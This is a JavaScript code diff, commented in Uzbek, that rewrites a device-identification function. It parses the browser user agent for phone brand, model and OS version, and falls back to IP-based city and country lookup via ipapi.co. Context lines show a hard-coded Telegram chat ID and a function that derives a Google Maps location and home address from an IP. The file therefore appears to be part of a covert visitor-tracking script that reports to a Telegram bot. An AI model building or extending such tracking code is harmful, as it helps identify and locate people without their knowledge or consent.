@@ -10,15 +10,66 @@ const chatId = '6852507131'; // Telegram chat ID
 
 // Qurilma haqida aniqroq ma'lumot olish funksiyasi
 async function getDeviceInfo() {
-    try {
-        const response = await fetch('https://api.deviceinfo.me');
-        const data = await response.json();
-        return `${data.device}, ${data.os}`;
-    } catch (error) {
-        console.error('Qurilma ma\'lumotlarini olishda xatolik:', error);
-        return 'Noma’lum qurilma';
+    const userAgent = navigator.userAgent;
+    
+    if (/Android/i.test(userAgent)) {
+        const match = userAgent.match(/Android\s([0-9.]*);?\s?([A-Za-z0-9\s\-\_\/]*)?/);
+        const version = match && match[1] ? match[1] : 'Noma’lum versiya';
+        const model = match && match[2] ? match[2].trim() : 'Noma’lum model';
+
+        if (/Samsung/i.test(userAgent)) return `Samsung, Android ${version}, Qurilma: ${model}`;
+        if (/Huawei/i.test(userAgent)) return `Huawei, Android ${version}, Qurilma: ${model}`;
+        if (/Xiaomi|Mi\s/i.test(userAgent)) return `Xiaomi, Android ${version}, Qurilma: ${model}`;
+        if (/Redmi/i.test(userAgent)) return `Redmi, Android ${version}, Qurilma: ${model}`;
+        if (/Oppo/i.test(userAgent)) return `Oppo, Android ${version}, Qurilma: ${model}`;
+        if (/Vivo/i.test(userAgent)) return `Vivo, Android ${version}, Qurilma: ${model}`;
+        if (/Realme/i.test(userAgent)) return `Realme, Android ${version}, Qurilma: ${model}`;
+        if (/OnePlus/i.test(userAgent)) return `OnePlus, Android ${version}, Qurilma: ${model}`;
+        if (/Google\sPixel/i.test(userAgent)) return `Google Pixel, Android ${version}, Qurilma: ${model}`;
+        if (/Motorola/i.test(userAgent)) return `Motorola, Android ${version}, Qurilma: ${model}`;
+        if (/Sony/i.test(userAgent)) return `Sony Xperia, Android ${version}, Qurilma: ${model}`;
+        if (/LG/i.test(userAgent)) return `LG, Android ${version}, Qurilma: ${model}`;
+        if (/Nokia/i.test(userAgent)) return `Nokia, Android ${version}, Qurilma: ${model}`;
+
+        return `Android ${version}, Qurilma: ${model}`;
+    } 
+    else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+        const match = userAgent.match(/OS\s([0-9_]+)/);
+        const version = match && match[1] ? match[1].replace(/_/g, '.') : 'Noma’lum versiya';
+
+        if (/iPhone/i.test(userAgent)) return `Apple Qurilma: iPhone, iOS ${version}`;
+        if (/iPad/i.test(userAgent)) return `Apple Qurilma: iPad, iOS ${version}`;
+        if (/iPod/i.test(userAgent)) return `Apple Qurilma: iPod, iOS ${version}`;
+
+        return `Apple Qurilma: iOS ${version}`;
+    }
+    else if (/Windows/i.test(userAgent)) {
+        if (/Windows\sPhone/i.test(userAgent)) return `Windows Phone: ${navigator.platform}`;
+        return `Windows tizimi: ${navigator.platform}`;
+    } 
+    else if (/Mac/i.test(userAgent)) {
+        return `macOS: ${navigator.platform}`;
+    } 
+    else if (/Linux/i.test(userAgent)) {
+        return `Linux tizimi: ${navigator.platform}`;
+    } 
+    else {
+        // Agar yuqoridagi usullar ishlamasa, API dan ma'lumot olishga harakat qiladi
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            if (!response.ok) throw new Error('API dan noto‘g‘ri javob keldi');
+            const data = await response.json();
+            return `${data.city}, ${data.region}, ${data.country_name}`;
+        } catch (error) {
+            console.error('Qurilma ma‘lumotlarini olishda xatolik:', error);
+            return 'Noma’lum qurilma';
+        }
     }
 }
+
+// Foydalanish:
+getDeviceInfo().then(info => console.log(info));
+
 
 // Google Maps havolasi va yashash manzilini olish funksiyasi
 async function getLocationDetails(ip) {
